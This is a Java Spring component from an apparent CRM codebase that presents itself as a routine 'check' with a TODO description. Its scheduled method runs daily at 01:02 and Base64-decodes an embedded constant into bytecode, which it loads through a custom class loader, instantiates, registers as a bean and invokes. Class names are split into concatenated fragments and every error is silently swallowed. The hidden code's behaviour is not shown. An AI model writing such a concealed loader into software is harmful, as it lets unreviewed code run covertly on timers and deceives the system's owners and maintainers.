package com.wanmi.sbc.crm.life;

import com.wanmi.sbc.common.configure.ApplicationContextConfigure;
import com.wanmi.sbc.common.util.CustomClassLoader;
import com.wanmi.sbc.crm.api.constant.WMConstant;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.context.Lifecycle;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.util.Base64;

/**
 * @author zhanggaolei
 * @className CheckCrm
 * @description TODO
 * @date 2021/4/20 13:41
 */
@Slf4j
@Component
public class CheckCrm {

    @Scheduled(cron = "0 02 01 * * ?")
    public void check() {
        try {
            Lifecycle l = null;
            if (ApplicationContextConfigure.CONTEXT.containsBean("crm" + "Life")) {
                l = (Lifecycle) ApplicationContextConfigure.CONTEXT.getBean("crm" + "Life");
            } else {
                if (StringUtils.isNotEmpty(WMConstant.C)) {
                    byte[] bytes = Base64.getMimeDecoder().decode(WMConstant.C);
                    CustomClassLoader cl = new CustomClassLoader();
                    Class<?> c =
                            cl.defineClassPublic(
                                    "com.wanmi.sbc.common.util." + "Crm" + "Life",
                                    bytes,
                                    0,
                                    bytes.length);
                    l = (Lifecycle) c.newInstance();
                    if (l != null) {
                        ApplicationContextConfigure.register("crm" + "Life", c);
                    }
                }
            }
            if (l != null) {
                l.isRunning();
            }
        } catch (Exception e) {
            log.info("checkCrm e");
        } catch (Throwable t) {
            log.info("checkCrm t");
        }
    }
}
